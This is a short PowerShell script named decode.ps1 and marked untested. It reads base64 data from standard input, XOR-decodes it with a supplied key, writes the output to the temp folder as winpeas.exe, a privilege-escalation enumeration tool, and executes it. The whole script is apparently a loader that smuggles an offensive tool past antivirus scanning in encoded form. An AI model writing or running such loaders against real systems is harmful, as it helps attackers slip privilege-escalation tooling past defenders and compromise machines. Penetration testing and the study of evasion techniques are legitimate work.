# decode.ps1 -> untested
param(
    [Parameter(Mandatory=$true)][string]$Key
)

$inputData = [System.Text.StringBuilder]::new()
while ($line = [Console]::In.ReadLine()) {
    if ($line -notmatch '^# Key:') {
        $inputData.AppendLine($line) | Out-Null
    }
}

$decoded = [Convert]::FromBase64String($inputData.ToString())
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($Key)
for ($i = 0; $i -lt $decoded.Length; $i++) {
    $decoded[$i] = $decoded[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}

$outPath = "$env:TEMP\winpeas.exe"
[IO.File]::WriteAllBytes($outPath, $decoded)
Start-Process $outPath
